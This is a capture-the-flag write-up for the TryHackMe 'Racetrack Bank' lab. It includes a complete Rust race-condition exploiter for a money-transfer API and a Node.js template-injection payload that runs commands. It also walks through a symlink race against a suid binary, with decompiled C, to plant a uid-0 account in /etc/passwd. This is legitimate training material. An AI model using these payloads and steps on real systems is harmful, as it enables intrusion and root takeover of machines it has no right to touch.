# Racetrack Bank

A Hard-rated room.

https://tryhackme.com/room/racetrackbank

Only ports 22 and 80 are open, and on 80 is a banking website where you can create a user, login and send money to other users. On new account creation it gives you 1 gold. Additionally, there is the ability to purchase 'premium' features for 10000 gold. Going by the name, this was some sort of race condition most likely in transferring money.

To bypass this, I created two users: one with the name and password `test` and the other with `test2`. Then I wrote a Rust program that would make concurrent webrequests from one to the other, sending the maximum amount of gold as many times as possible (~20 times over the VPN). Doing this back and forth only a couple of times was sufficient to give user `test` over 10000 gold... the code is in the appendix below.

Once done, I could buy the premium feature, which turned out to be a simple calculator field. Given that the server reports itself as running express, a nodejs web framework, I tried an injection payload which worked to achieve RCE: `{{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}}`.

After getting a reverse shell on the machine, whats immediately obvious is a directory under the user brian's home directory called 'admin'. In there is a suid binary called manageaccounts, which reads .account files and can add notes etc. To further examine this binary, I extracted it and decompiled it in ghidra, analysing the code and naming variables - the result is in the second sub heading below.

The code reads a file that ends with .account (which can be a symbolic link), reading three lines from it (account type, note and money amount). The note can be changed but not the money amount, and then it can be written back to the file. It also writes a log file, with some escaping. The log file and the note changing are unnecessary however - key is that the binary will write anywhere as its suid, and that the file it reads (containing whatever strings) can be written anywhere by removing the file and placing a symbolic link with the same name pointing to the target. Accordingly, the following steps were used to get a new root user on the machine:

1. create a file called `test.account`. This file should have content like the following:

    ```
    a
    brian::1000:1000:brian:/:/bin/sh
    user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash
    ```
    
2. run manageaccounts, and open the test.account file with the `f` command.
3. in a separate window, remove the test.account file.
4. create a new symbolic link with `ln -s /etc/password test.account`
5. back in the manageaccounts interface, use `w` to write the output, then `q` to exit the app.

At this point `su user3` and the password `pass123` will switch to the root account. The reason why this works is that you can fairly horrifically mangle the passwd file and as long as there are readable lines that follow the right format, it will still work. Note I ensured that the brian user was present - removing your current user can have some significant issues, like making `su` no longer work. Also note that even though on modern linux passwords are stored hashed in the /etc/shadow file, you can still add them to the passwd file (as it originally worked in the bad old days). user3 has the same uid and gid as the root account so signing in as user3 is the same as signing in as root.

A good room! Had a lot of fun - nice learning some utility rust coding.

## Rust race condition exploiter.

This requires the following cargo.toml dependencies:

```yaml
[dependencies]
anyhow = "1.0.70"
futures = "0.3.27"
reqwest = "0.11.15"
tokio = { version = "1.26.0", features = ["macros", "rt-multi-thread"] }
```

Ensure the appropriate users are created, and update the constant url in the code before running:

```rust
use std::collections::HashMap;
use anyhow::Result;

use futures::{stream, StreamExt};
use reqwest::{Proxy, header::COOKIE, redirect::Policy, Client};

const CONCURRENT: usize = 20;
const SITE_URL: &str = "http://10.10.57.199";

async fn client() -> Result<Client> {
    Ok(reqwest::Client::builder()
        .redirect(Policy::none())
        .build()?)
}

fn page_url(page: &str) -> String {
    format!("{}/{}", SITE_URL, page)
}

#[tokio::main]
async fn main() -> Result<()> {

    let user1 = get_auth_cookie("test").await?;
    let user2 = get_auth_cookie("test2").await?;

    let mut gold1 = get_gold_amount(&user1).await?;
    while gold1 < 10000 {
        println!("{gold1}");
        race_send(&user1, "test2", gold1).await?;
        let gold2 = get_gold_amount(&user2).await?;
        race_send(&user2, "test", gold2).await?;
        gold1 = get_gold_amount(&user1).await?;
    }    

    println!("done");
    Ok(())
}

async fn get_auth_cookie(username: &str) -> Result<String> {
    let client = client().await?;
    let mut params = HashMap::new();
    params.insert("username", username);
    params.insert("password", username);
    let resp = client.post(page_url("api/login")).form(&params).send().await?;

    let cookie = &resp.headers()["set-cookie"];
    let cookie = cookie.to_str().unwrap().to_string();
    Ok(cookie[..cookie.find(";").unwrap()+1].to_string())
}

async fn get_gold_amount(cookie: &str) -> Result<i32> {
    let client = client().await?;
    let resp = client.get(page_url("home.html")).header(COOKIE, cookie).send().await?;

    let body = resp.text().await?;
    let pos = body.find("Gold: ").unwrap();
    let pos2 = body[pos+6..].find("</a>").unwrap();
    let text = &body[pos+6..pos+pos2].trim();
    Ok(text.parse::<i32>().unwrap())
}

async fn race_send(cookie: &str, target_user: &str, amount: i32) -> Result<()> {
    let tasks = vec![(&cookie, &target_user, amount); CONCURRENT];
    let futures = 
        tasks.iter().map(|(cookie, target_user, amount)| async move {
            let client = reqwest::Client::builder()
            .redirect(Policy::none())
            .build().unwrap();

            let mut params = HashMap::new();
            params.insert("user", (**target_user).to_string());
            params.insert("amount", format!("{}", amount));
            client.post(page_url("api/givegold")).header(COOKIE, **cookie).form(&params).send().await.expect("failed to call");
        });
        
    stream::iter(futures).buffer_unordered(CONCURRENT).collect::<()>().await;
    Ok(())
}
```

## manageaccounts code

this is the main function, which was all that really mattered. i used ghidra 10.2.3 to decompile it, and then renamed variables as necessary as i examined the code.

```c
  setresuid(0,0,0);
  if (param_1 < 3) {
    if (param_1 == 1) {
      log_file_path = "log.txt";
    }
    else {
      log_file_path = *(char **)(param_2 + 8);
    }
    log_file_handle = fopen(log_file_path,"w");
    puts("Welcome to the bank API system user Brian!\n");
    showhelp();
    puVar3 = (undefined8 *)&account_opened;
    for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
    }
    *(undefined4 *)puVar3 = 0;
    *(undefined2 *)((long)puVar3 + 4) = 0;
    entered_command = getChoice();
    while (entered_command != 'q') {
      valid_action = isValidAction((int)entered_command);
      if (valid_action == '\0') {
        puts("Unrecognised action. Type h for help.\n");
      }
      else {
        fputc((int)entered_command,log_file_handle);
        if (entered_command == 'h') {
          showhelp();
        }
        else if (entered_command == 'f') {
          puts("\nEnter the path to the account file you want to open:");
          max_input = 0x20;
          input = (char *)malloc(0x20);
          getline(&input,&max_input,stdin);
          local_1b8 = strchr(input,10);
          if (local_1b8 != (char *)0x0) {
            *local_1b8 = '\0';
          }
          input_len = strlen(input);
          if (0x1e < input_len) {
            puts("Filename too long...");
            result_code = 1;
            goto LAB_001014f8;
          }
          escape(input);
          fprintf(log_file_handle," \'%s\' ",input);
          iVar1 = EndsWith(input,".account");
          if (iVar1 == 0) {
            puts("That file does not end in .account!");
          }
          else {
            account_file_handle = fopen(input,"r");
            if (account_file_handle == (FILE *)0x0) {
              puts("That account does not exist!");
            }
            else {
              fgets(account_user_type,0xff,account_file_handle);
              is_admin = account_user_type[0] == 'a';
              fgets(account_note,0x32,account_file_handle);
              fgets(account_money,0x32,account_file_handle);
              fclose(account_file_handle);
              strcpy(account_file_name,input);
              account_opened = '\x01';
              puts("File read successful!\n");
            }
          }
        }
        else if (entered_command == 'o') {
          if (account_opened == '\0') {
            puts("You have no account file open!");
          }
          else {
            if (is_admin == '\0') {
              puts("This user is a normal user.");
            }
            else {
              puts("This user is an admin.");
            }
            printf("The user\'s note is: %s\n",account_note);
          }
        }
        else if (entered_command == 'c') {
          if (account_opened == '\0') {
            puts("You have no account file open!");
          }
          else {
            is_admin = is_admin == '\0';
            if ((bool)is_admin) {
              puts("The account type is now admin.");
            }
            else {
              puts("The account type is now normal user.");
            }
          }
        }
        else if (entered_command == 'n') {
          puts("\nEnter the new note for the file:");
          max_input = 0x32;
          input = (char *)malloc(0x32);
          getline(&input,&max_input,stdin);
          local_1c0 = strchr(input,10);
          if (local_1c0 != (char *)0x0) {
            *local_1c0 = '\0';
          }
          input_len = strlen(input);
          if (0x30 < input_len) {
            puts("Note too long...");
            result_code = 1;
            goto LAB_001014f8;
          }
          escape(input);
          fprintf(log_file_handle," \'%s\' ",input);
          if (account_opened == '\0') {
            puts("Error: you need to load a file first!");
          }
          else {
            strcpy(account_note,input);
            puts("Note set successfully!");
          }
        }
        else if (entered_command == 'w') {
          if (account_opened == '\0') {
            puts("You need to load a file first!");
          }
          else {
            account_file_handle2 = fopen(account_file_name,"w");
            if (is_admin == '\0') {
              account_user_type_to_set = &char_a;
            }
            else {
              account_user_type_to_set = &char_v;
            }
            fprintf(account_file_handle2,"%s\n",account_user_type_to_set);
            fprintf(account_file_handle2,"%s\n",account_note);
            fprintf(account_file_handle2,"%s\n",account_money);
            fclose(account_file_handle2);
            puts("Changes written.\n");
          }
        }
        else if (entered_command == 'm') {
          if (account_opened == '\0') {
            puts("You need to load a file first!");
          }
          else {
            printf("This account currently has $%s\n",account_money);
          }
        }
        else if (entered_command == 'd') {
          puts("\nEnter your deletion request message:");
          max_input = 0x32;
          input = (char *)malloc(0x32);
          getline(&input,&max_input,stdin);
          local_1d0 = strchr(input,10);
          if (local_1d0 == (char *)0x0) {
            puts("Message is too long...");
            result_code = 1;
            goto LAB_001014f8;
          }
          *local_1d0 = '\0';
          escape(input);
          fprintf(log_file_handle," \'%s\' ",input);
          if (account_opened == '\0') {
            puts("Error: you need to load a file first!");
          }
          else {
            puts("Your request has been logged.");
          }
        }
      }
      entered_command = getChoice();
    }
    fwrite(&char_q,1,2,log_file_handle);
    puts("\nSaving log data...");
    fclose(log_file_handle);
    result_code = 0;
```
